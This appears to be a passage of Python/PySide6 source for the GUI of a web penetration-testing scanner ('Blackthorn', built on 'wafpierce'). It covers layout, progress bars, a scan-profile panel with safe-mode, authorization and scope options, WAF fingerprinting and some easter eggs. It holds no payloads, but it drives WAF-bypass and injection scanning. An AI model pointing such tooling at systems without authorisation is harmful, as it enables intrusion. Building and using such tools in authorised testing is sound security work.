                    border-radius: 6px;
                }
            ''')
            total_progress_layout.addWidget(total_progress_label)
            total_progress_layout.addWidget(self._total_progress_bar, 1)
            right_v.addLayout(total_progress_layout)
            
            right_v.addWidget(QLabel(_t('output', self._lang)))
            right_v.addWidget(self.log, 1)
            # Results button at bottom of output area
            self.results_btn = QPushButton(_t('results', self._lang))
            self.results_btn.setEnabled(False)
            self.results_btn.setFixedHeight(40)
            self._results_btn_base_style = '''
                QPushButton {
                    background-color: #1a212b;
                    color: #e6eaf0;
                    border: 1px solid #262f3b;
                    padding: 8px 20px;
                    border-radius: 8px;
                    font-size: 14px;
                    font-weight: bold;
                }
                QPushButton:hover {
                    background-color: #1f2731;
                    border-color: #6366f1;
                }
                QPushButton:disabled {
                    background-color: #12161d;
                    color: #6b7585;
                    border-color: #1c232d;
                }
            '''
            self._results_btn_green_style = '''
                QPushButton {
                    background-color: #22c55e;
                    color: #000000;
                    border: none;
                    padding: 8px 20px;
                    border-radius: 5px;
                    font-size: 14px;
                    font-weight: bold;
                }
                QPushButton:hover {
                    background-color: #16a34a;
                }
            '''
            self.results_btn.setStyleSheet(self._results_btn_base_style)
            self.results_btn.clicked.connect(lambda: self._navigate('results'))
            right_v.addWidget(self.results_btn)
            
            # Setup pulsating animation for Results button
            self._results_pulse_effect = QGraphicsOpacityEffect(self.results_btn)
            self.results_btn.setGraphicsEffect(self._results_pulse_effect)
            self._results_pulse_effect.setOpacity(1.0)
            self._results_pulse_anim = QPropertyAnimation(self._results_pulse_effect, b'opacity')
            self._results_pulse_anim.setDuration(1000)
            self._results_pulse_anim.setStartValue(1.0)
            self._results_pulse_anim.setEndValue(0.6)
            self._results_pulse_anim.setEasingCurve(QEasingCurve.InOutSine)
            self._results_pulse_anim.setLoopCount(-1)  # Infinite loop
            # Make it pulse back and forth
            self._results_pulse_anim.finished.connect(lambda: None)  # placeholder
            self._results_pulse_timer = QTimer()
            self._results_pulse_timer.timeout.connect(self._toggle_pulse_direction)
            self._results_pulse_forward = True
            
            middle.addLayout(right_v, 3)
            v.addLayout(middle, 1)

            # bottom controls
            bottom = QHBoxLayout()
            self._layout_bottom = bottom
            self.start_btn = QPushButton(_t('start', self._lang))
            self.start_btn.setObjectName('PrimaryButton')
            self.start_btn.setMinimumHeight(38)
            self.start_btn.clicked.connect(self.start_scan)
            self.stop_btn = QPushButton(_t('stop', self._lang))
            self.stop_btn.setObjectName('DangerButton')
            self.stop_btn.setMinimumHeight(38)
            self.stop_btn.setEnabled(False)
            self.stop_btn.clicked.connect(self.stop_scan)
            self.save_btn = QPushButton(_t('save', self._lang))
            self.save_btn.setEnabled(False)
            self.save_btn.clicked.connect(self.save_results)
            # cleanup button: clear temp files and also clear the UI
            self.clean_btn = QPushButton(_t('clear', self._lang))
            # when clicked by user from the UI, also clear the site list and outputs
            try:
                self.clean_btn.clicked.connect(lambda: self.clean_tmp_files(False, True))
            except Exception:
                try:
                    self.clean_btn.clicked.connect(self.clean_tmp_files)
                except Exception:
                    pass
            # removed bottom Settings button (moved to top controls)
            bottom.addWidget(self.start_btn)
            bottom.addWidget(self.stop_btn)
            bottom.addWidget(self.save_btn)
            bottom.addWidget(self.clean_btn)
            v.addLayout(bottom)

            # Scheduler: poll once a minute for due scheduled jobs (scan or recon).
            try:
                self._sched_timer = QTimer(self)
                self._sched_timer.timeout.connect(self._check_due_schedules)
                self._sched_timer.start(60000)
            except Exception:
                pass

        # ------------------------------------------------------------------ #
        # Single-page navigation framework
        # ------------------------------------------------------------------ #
        def _page_builders(self):
            """key -> zero-arg builder returning a QWidget page. Resolved by
            convention (`_build_<key>_page`); only implemented builders register,
            so any section without one falls back to its legacy dialog. This lets
            sections migrate to in-place pages one at a time without breakage."""
            keys = ['pipeline', 'recon', 'browser', 'fuzzer', 'secrets', 'sqli',
                    'repeater', 'payloads', 'plugins', 'schedule', 'timeline',
                    'dashboard', 'results', 'live', 'settings', 'ai',
                    'tools', 'zapburp', 'adint', 'proxy', 'engagements']
            out = {}
            for k in keys:
                fn = getattr(self, f'_build_{k}_page', None)
                if callable(fn):
                    out[k] = fn
            return out

        def _legacy_actions(self):
            """Fallback dialog openers for any section without a page builder.

            Every nav section now has a `_build_<key>_page`, so this is normally
            empty; it remains as a safety net (resolved by getattr) for any future
            section added before its page builder exists."""
            mapping = {}
            out = {}
            for key, name in mapping.items():
                fn = getattr(self, name, None)
                if callable(fn):
                    out[key] = fn
            return out

        def _navigate(self, key):
            """Switch the central panel to section ``key`` without disturbing any
            background work. Pages are built once and cached."""
            if key == 'scan':
                page = self._pages.get('scan')
                if page is not None:
                    self._stack.setCurrentWidget(page)
                self._highlight_nav('scan')
                try:
                    self.target_edit.setFocus()
                except Exception:
                    pass
                return

            # Data-driven sections rebuild fresh each visit so they never show
            # stale content; stateful sections (a running recon process, the live
            # feed, an in-progress repeater request, the settings form) persist.
            dynamic = {'dashboard', 'results', 'timeline', 'plugins',
                       'schedule', 'payloads', 'engagements', 'ai'}
            page = self._pages.get(key)
            if page is not None and key in dynamic:
                try:
                    self._stack.removeWidget(page)
                    page.deleteLater()
                except Exception:
                    pass
                page = None
                self._pages.pop(key, None)
            if page is None:
                builder = self._page_builders().get(key)
                if builder is not None:
                    try:
                        page = builder()
                    except Exception as e:
                        try:
                            self.append_log(f"[!] Could not open '{key}': {e}\n")
                        except Exception:
                            pass
                        return
                    if page is not None:
                        holder = self._wrap_scroll(page)
                        self._stack.addWidget(holder)
                        self._pages[key] = holder
            if page is not None:
                self._stack.setCurrentWidget(self._pages[key])
                self._highlight_nav(key)
            else:
                # No page builder -> legacy dialog (still keeps scans running).
                fn = self._legacy_actions().get(key)
                if fn is not None:
                    fn()

        def _wrap_scroll(self, widget):
            """Wrap a page in a frameless, resizable scroll area so content that is
            taller/wider than the window scrolls instead of clipping (several
            sections began life as wider dialogs)."""
            from PySide6.QtWidgets import QScrollArea, QFrame, QSizePolicy
            from PySide6.QtCore import Qt

            class PageScrollArea(QScrollArea):
                def resizeEvent(self, event):
                    super().resizeEvent(event)
                    child = self.widget()
                    if child is None:
                        return
                    try:
                        # Keep width responsive, but preserve the page's natural
                        # height so the vertical scrollbar appears when needed.
                        child.layout().activate() if child.layout() else None
                        child.setMinimumWidth(max(0, self.viewport().width() - 2))
                        child.setMinimumHeight(child.sizeHint().height())
                    except Exception:
                        pass

            sa = PageScrollArea()
            sa.setObjectName('PageScroll')
            sa.setFrameShape(QFrame.NoFrame)
            sa.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAsNeeded)
            sa.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAsNeeded)
            sa.setWidgetResizable(True)
            try:
                widget.setSizePolicy(QSizePolicy.Policy.Preferred, QSizePolicy.Policy.Minimum)
                if widget.layout():
                    widget.layout().setSizeConstraint(QtWidgets.QLayout.SizeConstraint.SetMinimumSize)
                    widget.layout().activate()
                widget.setMinimumHeight(widget.sizeHint().height())
            except Exception:
                pass
            sa.setWidget(widget)
            return sa

        def _highlight_nav(self, key):
            """Mark the active nav button (drives the QSS [active] selector)."""
            for k, btn in (getattr(self, '_nav_buttons', None) or {}).items():
                try:
                    btn.setProperty('active', 'true' if k == key else 'false')
                    btn.style().unpolish(btn)
                    btn.style().polish(btn)
                except Exception:
                    pass

        def _build_scan_profile_panel(self):
            """In-page scan profile controls replacing the fixed category dialog."""
            panel = QtWidgets.QGroupBox('Scan Profile & Scope')
            panel.setObjectName('ScanProfilePanel')
            layout = QtWidgets.QVBoxLayout(panel)
            layout.setSpacing(10)

            top = QHBoxLayout()
            engagement_lbl = QLabel('Engagement:')
            engagement_lbl.setObjectName('FieldLabel')
            engagement_lbl.setFixedWidth(130)
            top.addWidget(engagement_lbl)
            self._engagement_combo = QtWidgets.QComboBox()
            self._refresh_engagement_combo()
            top.addWidget(self._engagement_combo, 1)
            manage_btn = QPushButton('Manage')
            manage_btn.clicked.connect(lambda: self._navigate('engagements'))
            top.addWidget(manage_btn)
            layout.addLayout(top)

            auth = QtWidgets.QGridLayout()
            self._authorize_file_edit = QLineEdit()
            self._authorize_file_edit.setPlaceholderText('optional allowlist file for --authorize')
            browse_btn = QPushButton('Browse')
            browse_btn.clicked.connect(self._browse_authorize_file)
            self._scope_include_edit = QLineEdit()
            self._scope_include_edit.setPlaceholderText('optional regex, comma-separated')
            self._scope_exclude_edit = QLineEdit()
            self._scope_exclude_edit.setPlaceholderText('optional regex, comma-separated')
            auth.setColumnMinimumWidth(0, 130)
            auth.setColumnStretch(1, 1)
            for _row, _text in enumerate(('Authorization file:', 'Scope include:', 'Scope exclude:')):
                _lbl = QLabel(_text)
                _lbl.setObjectName('FieldLabel')
                _lbl.setMinimumWidth(130)
                auth.addWidget(_lbl, _row, 0)
            auth.addWidget(self._authorize_file_edit, 0, 1)
            auth.addWidget(browse_btn, 0, 2)
            auth.addWidget(self._scope_include_edit, 1, 1, 1, 2)
            auth.addWidget(self._scope_exclude_edit, 2, 1, 1, 2)
            layout.addLayout(auth)

            adv = (self._prefs.get('advanced') or {}) if hasattr(self, '_prefs') else {}
            controls = QHBoxLayout()
            self._safe_mode_chk = QCheckBox('Safe mode')
            self._safe_mode_chk.setChecked(bool(adv.get('safe_mode', True)))
            self._safe_mode_chk.setToolTip('Skip noisy/DoS-flavored and state-changing techniques')
            self._dry_run_chk = QCheckBox('Dry run')
            self._dry_run_chk.setChecked(bool(adv.get('dry_run', False)))
            self._dry_run_chk.setToolTip('Print the scan plan without sending requests')
            self._reconfirm_chk = QCheckBox('Re-confirm findings')
            self._reconfirm_chk.setChecked(not adv.get('no_reconfirm', False))
            self._impersonate_chk = QCheckBox('Impersonate browser')
            self._impersonate_chk.setChecked(bool(adv.get('impersonate')))
            self._ai_triage_chk = QCheckBox('AI triage')
            self._ai_triage_chk.setChecked(bool(adv.get('ai_triage', False)))
            self._oob_combo = QtWidgets.QComboBox()
            self._oob_combo.addItem('OOB off', 'off')
            self._oob_combo.addItem('Interactsh', 'interactsh')
            self._oob_combo.addItem('Self-hosted', 'selfhosted')
            self._oob_combo.setCurrentIndex({'off': 0, 'interactsh': 1,
                                             'selfhosted': 2}.get(adv.get('oob', 'off'), 0))
            for w in (self._safe_mode_chk, self._dry_run_chk, self._reconfirm_chk,
                      self._impersonate_chk, self._ai_triage_chk):
                controls.addWidget(w)
            controls.addWidget(self._oob_combo)
            controls.addStretch()
            layout.addLayout(controls)

            cat_header = QHBoxLayout()
            cat_header.addWidget(QLabel('Categories:'))
            select_all = QPushButton('Select All')
            deselect_all = QPushButton('Deselect All')
            cat_header.addStretch()
            cat_header.addWidget(select_all)
            cat_header.addWidget(deselect_all)
            layout.addLayout(cat_header)

            cats = QtWidgets.QGridLayout()
            cats.setSpacing(4)
            self._scan_cat_checks = {}
            saved_cats = adv.get('categories')
            saved_set = set(saved_cats or SCAN_CATEGORIES_GUI.keys())
            for i, (cat_key, cat_info) in enumerate(SCAN_CATEGORIES_GUI.items()):
                cb = QCheckBox(_t(cat_info['name_key'], self._lang))
                cb.setToolTip(cat_info['description'])
                cb.setChecked(cat_key in saved_set)
                self._scan_cat_checks[cat_key] = cb
                cats.addWidget(cb, i // 4, i % 4)
            layout.addLayout(cats)

            select_all.clicked.connect(lambda checked=False: [cb.setChecked(True) for cb in self._scan_cat_checks.values()])
            deselect_all.clicked.connect(lambda checked=False: [cb.setChecked(False) for cb in self._scan_cat_checks.values()])
            return panel

        def _refresh_engagement_combo(self):
            combo = getattr(self, '_engagement_combo', None)
            if combo is None:
                return
            current = combo.currentData() if combo.count() else self._prefs.get('current_engagement_id')
            combo.clear()
            combo.addItem('No engagement selected', None)
            if self._db:
                try:
                    for engagement in self._db.list_engagements():
                        combo.addItem(engagement.get('name', 'Engagement'),
                                      engagement.get('id'))
                except Exception:
                    pass
            for i in range(combo.count()):
                if combo.itemData(i) == current:
                    combo.setCurrentIndex(i)
                    break

        def _browse_authorize_file(self):
            try:
                path, _ = QFileDialog.getOpenFileName(
                    self, 'Select authorization allowlist', '',
                    'Text files (*.txt);;All files (*)')
                if path:
                    self._authorize_file_edit.setText(path)
            except Exception:
                pass

        def _split_patterns(self, text):
            return [p.strip() for p in str(text or '').replace('\n', ',').split(',')
                    if p.strip()]

        def _read_scan_profile_panel(self):
            """Return (selected_categories, advanced_opts) from the in-page panel."""
            checks = getattr(self, '_scan_cat_checks', None)
            if not checks:
                return None
            selected = [k for k, cb in checks.items() if cb.isChecked()]
            if not selected:
                QMessageBox.warning(self, 'Scan Profile', 'Select at least one scan category.')
                return None
            prefs = _load_prefs()
            ai_provider = prefs.get('ai_provider') or 'anthropic'
            ai_key = (prefs.get('ai_api_key') or prefs.get('anthropic_api_key') or None)
            advanced = {
                'categories': selected,
                'safe_mode': bool(self._safe_mode_chk.isChecked()),
                'dry_run': bool(self._dry_run_chk.isChecked()),
                'no_reconfirm': not bool(self._reconfirm_chk.isChecked()),
                'impersonate': 'chrome' if self._impersonate_chk.isChecked() else None,
                'oob': self._oob_combo.currentData() if getattr(self, '_oob_combo', None) else 'off',
                'ai_triage': bool(self._ai_triage_chk.isChecked()),
                'ai_provider': ai_provider,
                'ai_key': ai_key,
                'ai_model': prefs.get('ai_model') or None,
                'ai_base_url': prefs.get('ai_base_url') or None,
                'authorize': self._authorize_file_edit.text().strip(),
                'scope_include': self._split_patterns(self._scope_include_edit.text()),
                'scope_exclude': self._split_patterns(self._scope_exclude_edit.text()),
                'engagement_id': self._engagement_combo.currentData()
                    if getattr(self, '_engagement_combo', None) else None,
            }
            try:
                prefs['advanced'] = advanced
                prefs['current_engagement_id'] = advanced.get('engagement_id')
                _save_prefs(prefs)
                self._prefs = prefs
            except Exception:
                pass
            return selected, advanced

        def append_log(self, text: str):
            self.log.append(text)
        
        def _censor(self, url: str) -> str:
            """Censor a URL if censoring is enabled."""
            return _censor_url(url, getattr(self, '_censor_sites', False))
        
        def _refresh_tree_display(self):
            """Refresh tree item display text based on current censor setting."""
            try:
                for i in range(self.tree.topLevelItemCount()):
                    item = self.tree.topLevelItem(i)
                    actual_url = item.data(0, 256)
                    if actual_url:
                        # Update display text with current censor setting
                        display_text = self._censor(actual_url)
                        item.setText(0, display_text)
            except Exception:
                pass

        def _toggle_pulse_direction(self):
            """Toggle pulsating animation direction for Results button."""
            try:
                if self._results_pulse_forward:
                    self._results_pulse_anim.setStartValue(1.0)
                    self._results_pulse_anim.setEndValue(0.6)
                else:
                    self._results_pulse_anim.setStartValue(0.6)
                    self._results_pulse_anim.setEndValue(1.0)
                self._results_pulse_forward = not self._results_pulse_forward
                self._results_pulse_anim.start()
            except Exception:
                pass

        def _start_results_pulse(self):
            """Start the pulsating animation on the Results button."""
            try:
                self._results_pulse_forward = True
                self._results_pulse_anim.setStartValue(1.0)
                self._results_pulse_anim.setEndValue(0.6)
                self._results_pulse_anim.setLoopCount(1)
                self._results_pulse_anim.finished.connect(self._toggle_pulse_direction)
                self._results_pulse_anim.start()
            except Exception:
                pass

        def _stop_results_pulse(self):
            """Stop the pulsating animation and reset opacity."""
            try:
                self._results_pulse_anim.stop()
                self._results_pulse_effect.setOpacity(1.0)
            except Exception:
                pass

        # ==================== EASTER EGGS ====================
        
        def keyPressEvent(self, event):
            """Track key presses for Konami code easter egg."""
            try:
                from PySide6.QtCore import Qt
                key_map = {
                    Qt.Key_Up: 'up', Qt.Key_Down: 'down',
                    Qt.Key_Left: 'left', Qt.Key_Right: 'right',
                    Qt.Key_B: 'b', Qt.Key_A: 'a'
                }
                key = key_map.get(event.key())
                if key:
                    self._konami_sequence.append(key)
                    # Keep only last 10 keys
                    self._konami_sequence = self._konami_sequence[-10:]
                    if self._konami_sequence == self._konami_code:
                        self._trigger_konami_easter_egg()
                        self._konami_sequence = []
            except Exception:
                pass
            try:
                super().keyPressEvent(event)
            except Exception:
                pass

        def _check_easter_egg_input(self, text):
            """Check for special easter egg commands in target input."""
            try:
                lower = text.lower().strip()
                if lower == 'matrix':
                    self._trigger_matrix_easter_egg()
                    self.target_edit.clear()
                elif lower == 'hack the planet':
                    self._trigger_hacktheplanet_easter_egg()
                    self.target_edit.clear()
                elif lower == 'whoami':
                    self._trigger_whoami_easter_egg()
                    self.target_edit.clear()
                elif lower == 'syria':
                    self._trigger_leet_easter_egg()
                    self.target_edit.clear()
            except Exception:
                pass

        def _trigger_konami_easter_egg(self):
            """Konami code activated - HACKER MODE!"""
            try:
                self._hacker_mode = not self._hacker_mode
                if self._hacker_mode:
                    self.setWindowTitle('Blackthorn - [HACKER MODE ACTIVATED] 💀')
                    self.append_log('\n' + '='*50)
                    self.append_log('🎮 KONAMI CODE ACTIVATED!')
                    self.append_log('💀 H A C K E R   M O D E   E N G A G E D 💀')
                    self.append_log('='*50)
                    self.append_log('"With great power comes great responsibility."')
                    self.append_log('='*50 + '\n')
                    # Add green glow effect
                    self.setStyleSheet(self.styleSheet() + '''
                        QWidget { border: 2px solid #00ff00; }
                    ''')
                else:
                    self.setWindowTitle(_t('window_title', self._lang))
                    self.append_log('\n[*] Hacker mode deactivated. Back to normal.\n')
                    # Remove glow - reload theme
                    try:
                        self._apply_qt_prefs(self._prefs)
                    except Exception:
                        pass
            except Exception:
                pass

        def _trigger_matrix_easter_egg(self):
            """Matrix rain effect in the log."""
            try:
                import random
                self.append_log('\n' + '='*50)
                self.append_log('🟢 ENTERING THE MATRIX... 🟢')
                self.append_log('='*50)
                chars = 'ﾊﾐﾋｰｳｼﾅﾓﾆｻﾜﾂｵﾘｱﾎﾃﾏｹﾒｴｶｷﾑﾕﾗｾﾈｽﾀﾇﾍ01'
                for _ in range(5):
                    line = ''.join(random.choice(chars) for _ in range(40))
                    self.append_log(f'  {line}')
                self.append_log('='*50)
                self.append_log('"There is no spoon." - The Matrix')
                self.append_log('='*50 + '\n')
            except Exception:
                pass

        def _trigger_hacktheplanet_easter_egg(self):
            """Hackers (1995) movie reference."""
            try:
                self.append_log('\n' + '='*50)
                self.append_log('🌍 HACK THE PLANET! 🌍')
                self.append_log('='*50)
                quotes = [
                    '"Mess with the best, die like the rest."',
                    '"Never send a boy to do a woman\'s job."',
                    '"Type cookie, you idiot!"',
                    '"It\'s in that place where I put that thing that time."',
                    '"RISC is good."',
                ]
                import random
                self.append_log(f'  {random.choice(quotes)}')
                self.append_log('  - Hackers (1995)')
                self.append_log('='*50 + '\n')
            except Exception:
                pass

        def _trigger_whoami_easter_egg(self):
            """Classic whoami command."""
            try:
                import os
                import socket
                user = os.getenv('USERNAME') or os.getenv('USER') or 'l33t_hacker'
                host = socket.gethostname()
                self.append_log('\n' + '='*50)
                self.append_log('🔍 IDENTITY CHECK 🔍')
                self.append_log('='*50)
                self.append_log(f'  User: {user}')
                self.append_log(f'  Host: {host}')
                self.append_log(f'  Status: Certified Penetration Tester 🎖️')
                self.append_log(f'  Threat Level: MAXIMUM 💀')
                self.append_log('='*50 + '\n')
            except Exception:
                pass

        def _trigger_leet_easter_egg(self):
            """syria -> 5yr14 """
            try:
                self.append_log('\n' + '='*50)
                self.append_log('syria -> 5yr14')
                self.append_log('='*50)
                self.append_log('   ')
                self.append_log('  im a cyber student and im from syria')
                self.append_log('  i live through a war and i want to be a penetration tester')
                self.append_log('='*50)
                self.append_log('  threw out the years i have learned a lot and i want to share my knowledge with the world')
                self.append_log('  i started on a shitty laptop in syria with a slow internet connection and now im here with a cool gui for my tool')
                self.append_log('  threw out the years i have learned a lot and i want to share my knowledge with the world')
                self.append_log('='*50 + '\n')
            except Exception:
                pass

        # ==================== END EASTER EGGS ====================

        def add_target(self):
            text = self.target_edit.text().strip()
            if not text:
                return
            parts = [p.strip() for p in text.replace(',', '\n').splitlines() if p.strip()]
            existing = [self.tree.topLevelItem(i).data(0, 256) or self.tree.topLevelItem(i).text(0) for i in range(self.tree.topLevelItemCount())]
            for p in parts:
                if p in existing:
                    continue
                # Display censored URL, store actual URL in data
                display_text = self._censor(p)
                it = QTreeWidgetItem([display_text, 'Queued', ''])
                it.setData(0, 256, p)  # Store actual URL in UserRole for scanning
                self.tree.addTopLevelItem(it)
                # Create and add progress bar
                self._create_progress_bar_for_item(it, p)
            self.target_edit.clear()
            try:
                self._update_legend_counts()
            except Exception:
                pass
        
        def _create_progress_bar_for_item(self, item, target):
            """Create a styled progress bar for a tree item."""
            try:
                progress_bar = QProgressBar()
                progress_bar.setMinimum(0)
                progress_bar.setMaximum(100)
                progress_bar.setValue(0)
                progress_bar.setTextVisible(True)
                progress_bar.setFormat('%p%')
                progress_bar.setFixedHeight(20)
                progress_bar.setStyleSheet(self._target_progress_default_style())
                self.tree.setItemWidget(item, 2, progress_bar)
                self._progress_bars[target] = progress_bar
            except Exception:
                pass

        def _target_progress_default_style(self):
            return '''
                QProgressBar {
                    border: 1px solid #30363d;
                    border-radius: 5px;
                    background-color: #21262d;
                    text-align: center;
                    color: #d7e1ea;
                    font-size: 11px;
                }
                QProgressBar::chunk {
                    background-color: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                        stop:0 #238636, stop:1 #2ea043);
                    border-radius: 4px;
                }
            '''

        def _total_progress_default_style(self):
            return '''
                QProgressBar {
                    border: 1px solid #30363d;
                    border-radius: 5px;
                    background-color: #21262d;
                    text-align: center;
                    color: #d7e1ea;
                    font-size: 12px;
                    font-weight: bold;
                }
                QProgressBar::chunk {
                    background-color: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                        stop:0 #2563eb, stop:1 #3b82f6);
                    border-radius: 4px;
                }
            '''

        def _reset_progress_after_stop(self):
            """Normalize progress UI after a user-initiated stop."""
            try:
                for i in range(self.tree.topLevelItemCount()):
                    it = self.tree.topLevelItem(i)
                    target = it.data(0, 256) or it.text(0)
                    status = (it.text(1) or '').lower()
                    if 'running' in status or 'aborted' in status:
                        it.setText(1, 'Queued')
                        try:
                            it.setBackground(0, QBrush())
                        except Exception:
                            pass
                    if target in self._progress_bars:
                        pb = self._progress_bars[target]
                        pb.setValue(0)
                        pb.setStyleSheet(self._target_progress_default_style())

                self._total_progress_bar.setValue(0)
                self._total_progress_bar.setStyleSheet(self._total_progress_default_style())
            except Exception:
                pass
        
        def _update_target_progress(self, target, progress):
            """Update the progress bar for a specific target."""
            try:
                if target in self._progress_bars:
                    progress_bar = self._progress_bars[target]
                    new_value = min(100, max(0, progress))
                    progress_bar.setValue(new_value)
                    # Change color based on progress
                    if progress >= 100:
                        progress_bar.setStyleSheet('''
                            QProgressBar {
                                border: 1px solid #238636;
                                border-radius: 5px;
                                background-color: #21262d;
                                text-align: center;
                                color: #d7e1ea;
                                font-size: 11px;
                            }
                            QProgressBar::chunk {
                                background-color: #238636;
                                border-radius: 4px;
                            }
                        ''')
                # Update total progress bar
                self._update_total_progress()
            except Exception as e:
                pass
        
        def _update_total_progress(self):
            """Update the total progress bar based on all target progress bars."""
            try:
                if not self._progress_bars:
                    return
                total = 0
                count = len(self._progress_bars)
                for pb in self._progress_bars.values():
                    total += pb.value()
                avg_progress = int(total / count) if count > 0 else 0
                self._total_progress_bar.setValue(avg_progress)
                # Change style when complete
                if avg_progress >= 100:
                    self._total_progress_bar.setStyleSheet('''
                        QProgressBar {
                            border: 1px solid #238636;
                            border-radius: 5px;
                            background-color: #21262d;
                            text-align: center;
                            color: #d7e1ea;
                            font-size: 12px;
                            font-weight: bold;
                        }
                        QProgressBar::chunk {
                            background-color: #238636;
                            border-radius: 4px;
                        }
                    ''')
            except Exception:
                pass

        def _on_qt_item_clicked(self, item, col):
            try:
                # if user clicked the status column (index 1) or the status text indicates done/error
                status = item.text(1).lower()
                if col == 1 or 'done' in status or 'error' in status or '❌' in item.text(1):
                    self.show_target_details(item, col)
            except Exception:
                pass

        def remove_selected(self):
            # remove selected top-level items from the tree
            sels = self.tree.selectedItems()
            if not sels:
                return
            for it in sels:
                try:
                    target = it.data(0, 256) or it.text(0)
                    # Clean up progress bar reference
                    if target in self._progress_bars:
                        del self._progress_bars[target]
                    idx = self.tree.indexOfTopLevelItem(it)
                    self.tree.takeTopLevelItem(idx)
                except Exception:
                    try:
                        # fallback: iterate and remove by text match
                        txt = it.data(0, 256) or it.text(0)
                        if txt in self._progress_bars:
                            del self._progress_bars[txt]
                        for i in range(self.tree.topLevelItemCount()-1, -1, -1):
                            item_target = self.tree.topLevelItem(i).data(0, 256) or self.tree.topLevelItem(i).text(0)
                            if item_target == txt:
                                self.tree.takeTopLevelItem(i)
                    except Exception:
                        pass
            try:
                self._update_legend_counts()
            except Exception:
                pass

        def clear_all(self):
            """Remove all targets and clear logs and internal state for the Qt UI."""
            try:
                # request abort of any running worker
                try:
                    if getattr(self, '_worker', None):
                        self._worker.abort()
                except Exception:
                    pass
                # remove all items
                for i in range(self.tree.topLevelItemCount()-1, -1, -1):
                    try:
                        self.tree.takeTopLevelItem(i)
                    except Exception:
                        pass
                # clear progress bars
                self._progress_bars.clear()
                # Reset total progress bar
                try:
                    self._total_progress_bar.setValue(0)
                except Exception:
                    pass
                # clear log and reset internal state
                try:
                    self.log.clear()
                except Exception:
                    try:
                        self.log.setPlainText('')
                    except Exception:
                        pass
                self._results = []
                self._tmp_result_paths = []
                self._target_tmp_map = {}
                self._per_target_results = {}
                try:
                    self.save_btn.setEnabled(False)
                    self.results_btn.setEnabled(False)
                    self._stop_results_pulse()
                    self.results_btn.setStyleSheet(self._results_btn_base_style)
                except Exception:
                    pass
            except Exception:
                pass

        def _detect_waf(self, target: str) -> tuple:
            """Detect WAF for a target. Returns (waf_name, confidence, indicators)."""
            try:
                import requests
                requests.packages.urllib3.disable_warnings()
                
                # Import WAF signatures from pierce
                from wafpierce.pierce import WAF_SIGNATURES
                
                resp = requests.get(target, timeout=5, verify=False, allow_redirects=True)
                headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
                cookies_str = str(resp.cookies.get_dict()).lower()
                server_header = headers_lower.get('server', '').lower()
                body_lower = resp.text.lower()[:5000]
                
                best_waf = None
                best_confidence = 0
                best_indicators = []
                
                for waf_name, signatures in WAF_SIGNATURES.items():
                    confidence = 0
                    indicators = []
                    
                    for sig_header in signatures.get('headers', []):
                        if sig_header.lower() in headers_lower:
                            confidence += 30
                            indicators.append(f"Header: {sig_header}")
                    
                    for sig_cookie in signatures.get('cookies', []):
                        if sig_cookie.lower() in cookies_str:
                            confidence += 25
                            indicators.append(f"Cookie: {sig_cookie}")
                    
                    for sig_server in signatures.get('server', []):
                        if sig_server.lower() in server_header:
                            confidence += 35
                            indicators.append(f"Server: {sig_server}")
                    
                    for pattern in signatures.get('body_patterns', []):
                        if pattern.lower() in body_lower:
                            confidence += 20
                            indicators.append(f"Body: {pattern}")
                    
                    if confidence > best_confidence:
                        best_waf = waf_name
                        best_confidence = confidence
                        best_indicators = indicators
                
                if best_confidence >= 30:
                    return (best_waf, best_confidence, best_indicators)
                return (None, 0, [])
            except Exception:
                return (None, 0, [])

        def start_scan(self):
            if self._worker_thread is not None:
                return
            self._stop_requested = False
            # Get actual URLs from data, fallback to text if not set
            targets = []
            for i in range(self.tree.topLevelItemCount()):
                item = self.tree.topLevelItem(i)
                target = item.data(0, 256) or item.text(0)
                if target:
                    targets.append(target)
            if not targets:
                t = self.target_edit.text().strip()
                if t:
                    targets = [t]
            if not targets:
                QMessageBox.warning(self, _t('missing_target', self._lang), _t('add_target_msg', self._lang))
                return
            
            scan_profile = self._read_scan_profile_panel() if hasattr(self, '_read_scan_profile_panel') else None
            if scan_profile is None:
                selected_categories = self._show_scan_selection_dialog()
                advanced_opts = getattr(self, '_pending_advanced', None) or {}
            else:
                selected_categories, advanced_opts = scan_profile
            if selected_categories is None:
                return
            
            # WAF Detection for first target
            self.log.clear()
            # Reset total progress bar
            try:
                self._total_progress_bar.setValue(0)
                self._total_progress_bar.setStyleSheet(self._total_progress_default_style())
                # Reset individual progress bars and ensure all targets have progress bars
                for i in range(self.tree.topLevelItemCount()):
                    item = self.tree.topLevelItem(i)
                    target = item.data(0, 256) or item.text(0)
                    if target not in self._progress_bars:
                        # Create missing progress bar
                        self._create_progress_bar_for_item(item, target)
                    else:
                        # Reset existing progress bar
                        self._progress_bars[target].setValue(0)
            except Exception:
                pass
            if advanced_opts.get('dry_run'):
                waf_name, confidence, indicators = None, 0, []
                self.append_log("[*] Dry run enabled: skipping pre-scan WAF detection request.\n")
                self._detected_waf = None
            else:
                self.append_log(f"[*] {_t('detecting_waf', self._lang)}\n")
                QtWidgets.QApplication.processEvents()
                waf_name, confidence, indicators = self._detect_waf(targets[0])
                if waf_name:
                    waf_display = waf_name.replace('_', ' ').title()
                    self.append_log(f"[+] 🛡️ {_t('waf_detected', self._lang).format(waf=waf_display)} (Confidence: {confidence}%)\n")
                    for ind in indicators[:3]:
                        self.append_log(f"    └─ {ind}\n")
                    self._detected_waf = waf_name
                else:
                    self.append_log(f"[*] {_t('no_waf_detected', self._lang)}\n")
                    self._detected_waf = None
            
            threads = int(self.threads_spin.value())
            delay = float(self.delay_spin.value())
            # reset
            self._results = []
            self._tmp_result_paths = []
            self._target_tmp_map = {}
            self._http_log = []  # Reset HTTP log
            self._ssl_info = {}  # Reset SSL info

            concurrent_val = int(self.concurrent_spin.value())
            use_concurrent = bool(self.use_concurrent_chk.isChecked())
            retry_failed = int(self._prefs.get('retry_failed', 0))

            # persist runtime prefs
            try:
                prefs = _load_prefs()
                prefs['threads'] = threads
                prefs['delay'] = delay
                prefs['concurrent'] = concurrent_val
                prefs['use_concurrent'] = use_concurrent
                prefs['qt_geometry'] = f"{self.width()}x{self.height()}"
                _save_prefs(prefs)
                self._prefs = prefs
            except Exception:
                pass
            # Caido proxy passthrough: route all scan traffic through Caido when
            # enabled in Settings -> Integrations (so requests land in Caido).
            try:
                if (self._prefs or {}).get('caido_route_scans'):
